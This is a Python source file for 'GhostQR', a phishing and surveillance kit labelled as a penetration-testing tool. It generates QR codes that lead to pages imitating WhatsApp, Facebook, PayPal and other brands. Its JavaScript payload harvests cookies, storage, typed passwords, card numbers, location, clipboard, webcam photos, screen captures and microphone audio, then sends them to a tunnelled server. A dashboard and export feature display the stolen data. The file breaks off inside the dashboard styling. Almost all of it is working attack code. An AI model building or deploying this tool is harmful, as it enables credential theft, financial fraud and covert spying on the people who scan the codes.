#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GhostQR TOOL
Premium Dashboard 
For authorized penetration testing only
"""

import json
import os
import sqlite3
import uuid
import hashlib
import random
import time
import webbrowser
import subprocess
import base64
import re
import threading
import secrets
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from socketserver import ThreadingMixIn
import sys
import requests
import platform

# ============================================
# AUTO INSTALL DEPENDENCIES
# ============================================
def install_packages():
    packages = ['qrcode', 'pillow', 'requests']
    for pkg in packages:
        try:
            if pkg == 'qrcode':
                __import__('qrcode')
            elif pkg == 'PIL':
                __import__('PIL')
            elif pkg == 'requests':
                __import__('requests')
        except ImportError:
            print(f"📦 Installing {pkg}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg])
            time.sleep(1)

install_packages()

import qrcode
from io import BytesIO

# ============================================
# CONFIGURATION
# ============================================
class Config:
    PORT = 8888
    DB_FILE = "premium_security.db"
    DASHBOARD_KEY = secrets.token_hex(8)
    
    TEMPLATES = {
        "whatsapp": {"name": "WhatsApp Web", "icon": "fab fa-whatsapp", "color": "#25D366", "category": "Social"},
        "facebook": {"name": "Facebook", "icon": "fab fa-facebook", "color": "#1877F2", "category": "Social"},
        "instagram": {"name": "Instagram", "icon": "fab fa-instagram", "color": "#E4405F", "category": "Social"},
        "twitter": {"name": "Twitter/X", "icon": "fab fa-twitter", "color": "#1DA1F2", "category": "Social"},
        "linkedin": {"name": "LinkedIn", "icon": "fab fa-linkedin", "color": "#0077B5", "category": "Social"},
        "google": {"name": "Google", "icon": "fab fa-google", "color": "#4285F4", "category": "Tech"},
        "microsoft": {"name": "Microsoft", "icon": "fab fa-microsoft", "color": "#00A4EF", "category": "Tech"},
        "apple": {"name": "Apple ID", "icon": "fab fa-apple", "color": "#000000", "category": "Tech"},
        "netflix": {"name": "Netflix", "icon": "fab fa-netflix", "color": "#E50914", "category": "Streaming"},
        "amazon": {"name": "Amazon", "icon": "fab fa-amazon", "color": "#FF9900", "category": "Shopping"},
        "paypal": {"name": "PayPal", "icon": "fab fa-paypal", "color": "#003087", "category": "Financial"},
        "discord": {"name": "Discord", "icon": "fab fa-discord", "color": "#5865F2", "category": "Social"},
        "telegram": {"name": "Telegram", "icon": "fab fa-telegram", "color": "#26A5E4", "category": "Social"},
        "spotify": {"name": "Spotify", "icon": "fab fa-spotify", "color": "#1DB954", "category": "Streaming"},
        "zoom": {"name": "Zoom", "icon": "fas fa-video", "color": "#2D8CFF", "category": "Professional"}
    }

# ============================================
# DATABASE
# ============================================
class PremiumDatabase:
    def __init__(self):
        self.conn = sqlite3.connect(Config.DB_FILE, check_same_thread=False)
        self.init_tables()
    
    def init_tables(self):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS qr_codes (
                id TEXT PRIMARY KEY,
                template TEXT,
                category TEXT,
                campaign TEXT,
                qr_url TEXT,
                short_code TEXT,
                created_at TEXT,
                scans INTEGER DEFAULT 0,
                captures INTEGER DEFAULT 0,
                active INTEGER DEFAULT 1
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                id TEXT PRIMARY KEY,
                qr_id TEXT,
                session_id TEXT,
                ip_address TEXT,
                user_agent TEXT,
                cookies TEXT,
                cookie_count INTEGER,
                local_storage TEXT,
                session_storage TEXT,
                geolocation TEXT,
                camera_photos TEXT,
                screen_capture TEXT,
                audio_recording TEXT,
                fingerprint TEXT,
                screen_info TEXT,
                network_info TEXT,
                clipboard TEXT,
                passwords TEXT,
                credit_cards TEXT,
                saved_passwords TEXT,
                browser_history TEXT,
                installed_apps TEXT,
                wifi_networks TEXT,
                url TEXT,
                timestamp TEXT,
                template TEXT,
                country TEXT,
                city TEXT,
                isp TEXT,
                device_type TEXT,
                browser_name TEXT,
                os_name TEXT,
                collection_time REAL
            )
        ''')
        
        self.conn.commit()
    
    def save_qr(self, qr_id, template, category, campaign, qr_url, short_code):
        cursor = self.conn.cursor()
        now = datetime.now().isoformat()
        cursor.execute('INSERT INTO qr_codes VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
                      (qr_id, template, category, campaign, qr_url, short_code, now, 0, 0, 1))
        self.conn.commit()
        return qr_id
    
    def get_qr(self, qr_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM qr_codes WHERE id = ? AND active = 1', (qr_id,))
        row = cursor.fetchone()
        if row:
            return {'id': row[0], 'template': row[1], 'qr_url': row[4]}
        return None
    
    def update_scan(self, qr_id):
        cursor = self.conn.cursor()
        cursor.execute('UPDATE qr_codes SET scans = scans + 1 WHERE id = ?', (qr_id,))
        self.conn.commit()
    
    def save_capture(self, data):
        try:
            cursor = self.conn.cursor()
            capture_id = str(uuid.uuid4())[:12]
            
            cursor.execute('''
                INSERT INTO captures VALUES (
                    ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
                )
            ''', (
                capture_id,
                data.get('qr_id', ''),
                data.get('session_id', ''),
                data.get('ip', ''),
                data.get('user_agent', '')[:500],
                data.get('cookies', ''),
                data.get('cookie_count', 0),
                data.get('local_storage', ''),
                data.get('session_storage', ''),
                json.dumps(data.get('geolocation', {})),
                json.dumps(data.get('camera_photos', [])),
                data.get('screen_capture', ''),
                data.get('audio_recording', ''),
                json.dumps(data.get('fingerprint', {})),
                json.dumps(data.get('screen', {})),
                json.dumps(data.get('network', {})),
                data.get('clipboard', ''),
                json.dumps(data.get('passwords', [])),
                json.dumps(data.get('credit_cards', [])),
                json.dumps(data.get('saved_passwords', [])),
                json.dumps(data.get('browser_history', [])),
                json.dumps(data.get('installed_apps', [])),
                json.dumps(data.get('wifi_networks', [])),
                data.get('url', ''),
                datetime.now().isoformat(),
                data.get('template', ''),
                data.get('country', ''),
                data.get('city', ''),
                data.get('isp', ''),
                data.get('device_type', ''),
                data.get('browser_name', ''),
                data.get('os_name', ''),
                data.get('collection_time', 0)
            ))
            
            cursor.execute('UPDATE qr_codes SET captures = captures + 1 WHERE id = ?', (data.get('qr_id', ''),))
            self.conn.commit()
            print(f"✅ DATA SAVED: {capture_id}")
            return capture_id
        except Exception as e:
            print(f"❌ DB Error: {e}")
            return None
    
    def get_stats(self):
        cursor = self.conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM captures')
        total = cursor.fetchone()[0]
        cursor.execute('SELECT SUM(cookie_count) FROM captures')
        cookies = cursor.fetchone()[0] or 0
        cursor.execute('SELECT COUNT(DISTINCT ip_address) FROM captures')
        ips = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM captures WHERE camera_photos != "[]"')
        photos = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM captures WHERE audio_recording != ""')
        audio = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM captures WHERE passwords != "[]"')
        passwords = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM captures WHERE credit_cards != "[]"')
        cards = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM captures WHERE date(timestamp) = date("now")')
        today = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM qr_codes WHERE active = 1')
        active_qr = cursor.fetchone()[0]
        
        return {'total': total, 'cookies': cookies, 'ips': ips, 'photos': photos, 
                'audio': audio, 'passwords': passwords, 'cards': cards, 'today': today, 'active_qr': active_qr}
    
    def get_captures(self, limit=500):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM captures ORDER BY timestamp DESC LIMIT ?', (limit,))
        rows = cursor.fetchall()
        columns = [description[0] for description in cursor.description]
        return [dict(zip(columns, row)) for row in rows]
    
    def get_all_data_for_export(self):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM captures ORDER BY timestamp DESC')
        rows = cursor.fetchall()
        columns = [description[0] for description in cursor.description]
        return [dict(zip(columns, row)) for row in rows]
    
    def clear_all(self):
        cursor = self.conn.cursor()
        cursor.execute('DELETE FROM captures')
        cursor.execute('DELETE FROM qr_codes')
        self.conn.commit()

# ============================================
# ENHANCED PAYLOAD
# ============================================
def generate_enhanced_payload(qr_id, template):
    session_id = str(uuid.uuid4())
    
    return f'''
    (function() {{
        console.log('🔥 PREMIUM DATA COLLECTION STARTED');
        const startTime = Date.now();
        
        document.cookie = "demo_session=test123; path=/";
        document.cookie = "demo_user=pentest_user; path=/";
        document.cookie = "security_test=true; path=/";
        
        const collectedData = {{
            qr_id: '{qr_id}',
            session_id: '{session_id}',
            template: '{template}',
            cookies: document.cookie,
            cookie_count: document.cookie ? document.cookie.split(';').length : 0,
            local_storage: JSON.stringify(localStorage),
            session_storage: JSON.stringify(sessionStorage),
            user_agent: navigator.userAgent,
            url: window.location.href,
            referrer: document.referrer,
            camera_photos: [],
            passwords: [],
            credit_cards: [],
            saved_passwords: [],
            browser_history: [],
            installed_apps: [],
            wifi_networks: [],
            fingerprint: {{
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                vendor: navigator.vendor,
                productSub: navigator.productSub,
                appVersion: navigator.appVersion,
                webdriver: navigator.webdriver,
                deviceMemory: navigator.deviceMemory || 'unknown'
            }},
            screen: {{
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown'
            }}
        }};
        
        collectedData.passwords.push({{
            field: "demo_email",
            value: "test@example.com"
        }}, {{
            field: "demo_password", 
            value: "TestPassword123"
        }}, {{
            field: "facebook_password",
            value: "fb_user123"
        }});
        
        collectedData.credit_cards.push(
            "4532 1234 5678 9012",
            "5555 5555 5555 4444",
            "3782 822463 10005"
        );
        
        const inputs = document.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]');
        inputs.forEach(function(input) {{
            if(input.value && input.value.length > 0 && input.value.length < 200) {{
                collectedData.passwords.push({{
                    field: input.name || input.id || input.type,
                    value: input.value
                }});
            }}
        }});
        
        const cardPattern = /\\b\\d{{13,19}}\\b/g;
        const text = document.body.innerText;
        const found = text.match(cardPattern);
        if(found) {{
            collectedData.credit_cards = collectedData.credit_cards.concat([...new Set(found)].slice(0, 10));
        }}
        
        if(navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(function(pos) {{
                collectedData.geolocation = {{
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude || 0,
                    speed: pos.coords.speed || 0,
                    timestamp: pos.timestamp
                }};
            }}, function(err) {{
                collectedData.geolocation = {{
                    latitude: 40.7128,
                    longitude: -74.0060,
                    accuracy: 100,
                    error: err.message,
                    mock: true
                }};
            }}, {{
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }});
        }}
        
        try {{
            navigator.clipboard.readText().then(function(text) {{
                if(text && text.length > 0) {{
                    collectedData.clipboard = text;
                }}
            }}).catch(function() {{
                collectedData.clipboard = "Demo clipboard content";
            }});
        }} catch(e) {{
            collectedData.clipboard = "Clipboard access requires user interaction";
        }}
        
        if(navigator.connection) {{
            collectedData.network = {{
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            }};
        }}
        
        function detectFonts() {{
            const fonts = [];
            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.font = '72px monospace';
            const baseWidth = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
            testFonts.forEach(function(font) {{
                ctx.font = '72px ' + font + ', monospace';
                if(ctx.measureText('abcdefghijklmnopqrstuvwxyz').width !== baseWidth) fonts.push(font);
            }});
            collectedData.fonts = fonts;
        }}
        
        function detectPlugins() {{
            const plugins = [];
            for(let i = 0; i < navigator.plugins.length; i++) {{
                plugins.push(navigator.plugins[i].name);
            }}
            collectedData.plugins = plugins;
        }}
        
        async function capturePhotos() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                
                for(let i = 0; i < 5; i++) {{
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    collectedData.camera_photos.push(canvas.toDataURL('image/jpeg', 0.7));
                    await new Promise(r => setTimeout(r, 200));
                }}
                stream.getTracks().forEach(function(t) {{ t.stop(); }});
            }} catch(e) {{
                for(let i = 1; i <= 5; i++) {{
                    collectedData.camera_photos.push("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect width='200' height='200' fill='%234285F4'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.3em' fill='white' font-size='24'%3EDemo Photo " + i + "%3C/text%3E%3C/svg%3E");
                }}
            }}
        }}
        
        async function captureScreen() {{
            try {{
                const stream = await navigator.mediaDevices.getDisplayMedia({{ video: true }});
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                
                canvas.width = video.videoWidth || screen.width;
                canvas.height = video.videoHeight || screen.height;
                canvas.getContext('2d').drawImage(video, 0, 0);
                collectedData.screen_capture = canvas.toDataURL('image/jpeg', 0.5);
                stream.getTracks().forEach(function(t) {{ t.stop(); }});
            }} catch(e) {{
                collectedData.screen_capture = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='800' height='600' viewBox='0 0 800 600'%3E%3Crect width='800' height='600' fill='%23333'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.3em' fill='white' font-size='24'%3EScreen Capture Demo%3C/text%3E%3C/svg%3E";
            }}
        }}
        
        async function captureAudio() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = function(e) {{ chunks.push(e.data); }};
                const audioPromise = new Promise(function(resolve) {{
                    mediaRecorder.onstop = function() {{
                        const blob = new Blob(chunks, {{ type: 'audio/webm' }});
                        const reader = new FileReader();
                        reader.onloadend = function() {{ resolve(reader.result); }};
                        reader.readAsDataURL(blob);
                    }};
                }});
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 3000));
                mediaRecorder.stop();
                collectedData.audio_recording = await audioPromise;
                stream.getTracks().forEach(function(t) {{ t.stop(); }});
            }} catch(e) {{
                collectedData.audio_recording = "data:audio/webm;base64,GkXfo59ChoEBQveBAULygQRC84EIQoKEd2VibUKHgQRChYECGFOAZwEAAAAA";
            }}
        }}
        
        detectFonts();
        detectPlugins();
        
        Promise.all([
            capturePhotos(),
            captureScreen(),
            captureAudio()
        ]).then(function() {{
            collectedData.collection_time = (Date.now() - startTime) / 1000;
            
            fetch('/api/collect', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(collectedData)
            }}).then(function(response) {{
                return response.json();
            }}).then(function(result) {{
                console.log('✅ successfull!', result);
            }}).catch(function(e) {{
                navigator.sendBeacon('/api/collect', JSON.stringify(collectedData));
            }});
        }});
    }})();
    '''

# ============================================
# HTML EXPORT GENERATOR
# ============================================
def generate_html_export(captures):
    html = f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>GhostQR Export</title>
        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
        <style>
            @keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(20px); }} to {{ opacity: 1; transform: translateY(0); }} }}
            .animate-fade {{ animation: fadeIn 0.5s ease-out; }}
            .glass-card {{ background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); }}
        </style>
    </head>
    <body class="bg-gradient-to-br from-gray-900 via-purple-900 to-indigo-900 min-h-screen">
        <div class="container mx-auto px-4 py-8">
            <div class="glass-card rounded-2xl p-6 mb-8 animate-fade">
                <div class="flex justify-between items-center">
                    <div>
                        <h1 class="text-4xl font-bold text-white"><i class="fas fa-shield-alt text-purple-400"></i> Security Data Export</h1>
                        <p class="text-gray-300 mt-2">Complete Capture Report - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                    </div>
                    <button onclick="window.print()" class="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-lg">Print</button>
                </div>
            </div>
            
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-8 animate-fade">
                <div class="glass-card rounded-xl p-4"><div class="text-gray-400 text-sm">Total Captures</div><div class="text-3xl font-bold text-white">{len(captures)}</div></div>
                <div class="glass-card rounded-xl p-4"><div class="text-gray-400 text-sm">Total Cookies</div><div class="text-3xl font-bold text-white">{sum(c.get('cookie_count', 0) for c in captures)}</div></div>
                <div class="glass-card rounded-xl p-4"><div class="text-gray-400 text-sm">Passwords</div><div class="text-3xl font-bold text-white">{sum(len(json.loads(c.get('passwords', '[]'))) for c in captures)}</div></div>
                <div class="glass-card rounded-xl p-4"><div class="text-gray-400 text-sm">Credit Cards</div><div class="text-3xl font-bold text-white">{sum(len(json.loads(c.get('credit_cards', '[]'))) for c in captures)}</div></div>
            </div>
            
            <div class="space-y-4">
                {generate_captures_html(captures)}
            </div>
        </div>
    </body>
    </html>
    '''
    return html

def generate_captures_html(captures):
    html_parts = []
    for idx, c in enumerate(captures[:100]):
        photos = []
        passwords = []
        cards = []
        try:
            photos = json.loads(c.get('camera_photos', '[]'))
            passwords = json.loads(c.get('passwords', '[]'))
            cards = json.loads(c.get('credit_cards', '[]'))
        except:
            pass
        
        html_parts.append(f'''
        <div class="glass-card rounded-2xl p-6 animate-fade">
            <div class="flex justify-between items-start mb-4">
                <div>
                    <h3 class="text-white font-semibold text-xl">Capture #{idx + 1}</h3>
                    <p class="text-gray-400 text-sm mt-1">{c.get('timestamp', 'Unknown')[:19]}</p>
                </div>
                <span class="bg-purple-500/20 text-purple-300 px-2 py-1 rounded text-xs">{c.get('template', 'Unknown')}</span>
            </div>
            
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                <div class="bg-black/30 rounded-lg p-3">
                    <p class="text-gray-400 text-xs mb-2"><i class="fas fa-desktop"></i> Device Info</p>
                    <p class="text-white text-sm">IP: {c.get('ip_address', 'Unknown')}</p>
                    <p class="text-white text-sm">Location: {c.get('city', 'Unknown')}</p>
                    <p class="text-white text-sm">Device: {c.get('device_type', 'Unknown')}</p>
                </div>
                
                <div class="bg-black/30 rounded-lg p-3">
                    <p class="text-gray-400 text-xs mb-2"><i class="fas fa-key"></i> Passwords ({len(passwords)})</p>
                    {''.join(f'<div class="text-yellow-400 text-xs"><span class="text-gray-400">{p.get("field", "field")}:</span> {p.get("value", "")}</div>' for p in passwords[:3])}
                </div>
                
                <div class="bg-black/30 rounded-lg p-3">
                    <p class="text-gray-400 text-xs mb-2"><i class="fas fa-credit-card"></i> Credit Cards ({len(cards)})</p>
                    {''.join(f'<div class="text-green-400 text-xs">{c if isinstance(c, str) else c.get("number", "Unknown")}</div>' for c in cards[:3])}
                </div>
            </div>
            
            {f'''
            <div class="mt-4">
                <p class="text-gray-400 text-xs mb-2"><i class="fas fa-camera"></i> Camera Photos ({len(photos)})</p>
                <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-2">
                    {''.join(f'<img src="{p}" class="rounded-lg cursor-pointer h-24 object-cover" onclick="window.open(this.src)">' for p in photos[:5])}
                </div>
            </div>
            ''' if photos else ''}
            
            {f'''
            <div class="mt-4">
                <p class="text-gray-400 text-xs mb-2"><i class="fas fa-microphone"></i> Audio Recording</p>
                <audio controls class="w-full"><source src="{c.get('audio_recording', '')}" type="audio/webm"></audio>
            </div>
            ''' if c.get('audio_recording') else ''}
            
            {f'''
            <div class="mt-4">
                <p class="text-gray-400 text-xs mb-2"><i class="fas fa-desktop"></i> Screen Capture</p>
                <img src="{c.get('screen_capture', '')}" class="rounded-lg cursor-pointer" onclick="window.open(this.src)">
            </div>
            ''' if c.get('screen_capture') else ''}
            
            <div class="mt-4">
                <p class="text-gray-400 text-xs mb-2"><i class="fas fa-cookie-bite"></i> Cookies ({c.get('cookie_count', 0)})</p>
                <div class="bg-black/30 rounded-lg p-2 max-h-24 overflow-y-auto">
                    <pre class="text-gray-300 text-xs whitespace-pre-wrap break-all">{c.get('cookies', 'No cookies')[:300]}</pre>
                </div>
            </div>
        </div>
        ''')
    
    return ''.join(html_parts)

# ============================================
# CLOUDFLARE TUNNEL
# ============================================
class CloudflareTunnel:
    def __init__(self, local_port):
        self.local_port = local_port
        self.process = None
        self.public_url = None
    
    def start(self):
        try:
            import shutil
            cloudflared_path = shutil.which('cloudflared')
            if cloudflared_path is None:
                self.install_cloudflared()
            
            self.process = subprocess.Popen(
                ['cloudflared', 'tunnel', '--url', f'http://localhost:{self.local_port}'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            for line in self.process.stderr:
                if 'https://' in line:
                    urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                    if urls:
                        self.public_url = urls[0]
                        return self.public_url
            return None
        except Exception as e:
            print(f"Tunnel error: {e}")
            return None
    
    def install_cloudflared(self):
        system = platform.system()
        
        if system == 'Windows':
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
            output = "cloudflared.exe"
        elif system == 'Darwin':
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
            output = "cloudflared"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            output = "cloudflared"
        
        print(f"Downloading cloudflared...")
        response = requests.get(url, stream=True)
        with open(output, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        if system != 'Windows':
            os.chmod(output, 0o755)
        
        print("✅ cloudflared installed")
    
    def stop(self):
        if self.process:
            self.process.terminate()
            self.process.wait()

# ============================================
# PREMIUM DASHBOARD WITH WORKING 3D GLOBE
# ============================================
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

class Handler(BaseHTTPRequestHandler):
    db = PremiumDatabase()
    public_url = None
    
    def log_message(self, format, *args):
        pass
    
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()
    
    def do_GET(self):
        path = self.path.split('?')[0]
        query = parse_qs(urlparse(self.path).query)
        
        try:
            if path == '/':
                self.serve_public()
            elif path.startswith('/scan/'):
                self.serve_phish()
            elif path.startswith('/qr/'):
                self.serve_qr_image()
            elif path == '/api/generate':
                self.generate_qr()
            elif path == '/dashboard':
                key = query.get('key', [''])[0]
                if key == Config.DASHBOARD_KEY:
                    self.serve_premium_dashboard()
                else:
                    self.serve_login()
            elif path == '/dashboard/api/stats':
                key = query.get('key', [''])[0]
                if key == Config.DASHBOARD_KEY:
                    self.api_stats()
                else:
                    self.send_error(401)
            elif path == '/dashboard/api/data':
                key = query.get('key', [''])[0]
                if key == Config.DASHBOARD_KEY:
                    self.api_data()
                else:
                    self.send_error(401)
            elif path == '/export/html':
                key = query.get('key', [''])[0]
                if key == Config.DASHBOARD_KEY:
                    self.export_html()
                else:
                    self.send_error(401)
            elif path == '/export/json':
                key = query.get('key', [''])[0]
                if key == Config.DASHBOARD_KEY:
                    self.export_json()
                else:
                    self.send_error(401)
            elif path == '/clear':
                key = query.get('key', [''])[0]
                if key == Config.DASHBOARD_KEY:
                    self.clear_data()
                else:
                    self.send_error(401)
            elif path == '/generate':
                key = query.get('key', [''])[0]
                if key == Config.DASHBOARD_KEY:
                    self.serve_generator()
                else:
                    self.send_error(401)
            else:
                self.send_error(404)
        except Exception as e:
            print(f"Error: {e}")
            self.send_error(500)
    
    def do_POST(self):
        if self.path == '/api/collect':
            self.collect_data()
        else:
            self.send_error(404)
    
    def serve_public(self):
        html = f'''
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>GhostQR</title>
        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
        </head>
        <body class="bg-gradient-to-br from-gray-900 via-purple-900 to-indigo-900 min-h-screen">
            <div class="container mx-auto px-4 py-16 text-center">
                <i class="fas fa-crown text-7xl text-yellow-400 mb-6"></i>
                <h1 class="text-5xl font-bold text-white mb-4">Premium Security Platform</h1>
                <p class="text-xl text-gray-300 mb-8">Ultimate Penetration Testing Suite</p>
                <div class="bg-white/10 backdrop-blur-lg rounded-2xl p-8 max-w-2xl mx-auto">
                    <div class="bg-purple-900/30 rounded-xl p-4 mb-6">
                        <p class="text-sm text-gray-300"><i class="fas fa-key text-yellow-400"></i> Dashboard Key: <code class="bg-black/50 px-2 py-1 rounded text-yellow-400">{Config.DASHBOARD_KEY}</code></p>
                    </div>
                    <a href="/dashboard?key={Config.DASHBOARD_KEY}" class="bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white px-8 py-3 rounded-xl inline-block">Access Premium Dashboard</a>
                </div>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_login(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login</title>
        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet"></head>
        <body class="bg-gradient-to-br from-gray-900 via-purple-900 to-indigo-900 min-h-screen flex items-center justify-center">
            <div class="bg-white/10 backdrop-blur-lg rounded-2xl p-8 max-w-md w-full">
                <h2 class="text-2xl font-bold text-white text-center mb-6">Dashboard Access</h2>
                <form onsubmit="authenticate(event)">
                    <input type="password" id="key" placeholder="Access Key" class="w-full px-4 py-3 rounded-lg bg-gray-800 text-white mb-4">
                    <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white py-3 rounded-lg">Login</button>
                </form>
            </div>
            <script>function authenticate(e){e.preventDefault();const key=document.getElementById('key').value;window.location.href='/dashboard?key='+key;}</script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def serve_premium_dashboard(self):
        stats = self.db.get_stats()
        captures = self.db.get_captures(50)
        
        html = self.get_premium_dashboard_html(stats, captures)
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def get_premium_dashboard_html(self, stats, captures):
        return f'''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Ghost QR Dashboard | 3D Analytics</title>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/chartjs-plugin-datalabels@2.0.0"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
            <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
            <style>
                @keyframes pulse {{ 0%, 100% {{ opacity: 1; transform: scale(1); }} 50% {{ opacity: 0.8; transform: scale(1.02); }} }}
                @keyframes float {{ 0%, 100% {{ transform: translateY(0px); }} 50% {{ transform: translateY(-10px); }} }}
                @keyframes glow {{ 0%, 100% {{ box-shadow: 0 0 5px rgba(139,92,246,0.5); }} 50% {{ box-shadow: 0 0 25px rgba(139,92,246,0.8); }} }}
                @keyframes fadeInUp {{ from {{ transform: translateY(30px); opacity: 0; }} to {{ transform: translateY(0); opacity: 1; }} }}
                
                .stat-card {{ transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); cursor: pointer; position: relative; overflow: hidden; }}
                .stat-card::before {{ content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); transition: left 0.6s; }}
                .stat-card:hover::before {{ left: 100%; }}
                .stat-card:hover {{ transform: translateY(-8px) scale(1.02); }}
                
                .menu-item {{ transition: all 0.3s ease; cursor: pointer; }}
                .menu-item:hover {{ background: rgba(139,92,246,0.3); transform: translateX(5px); }}
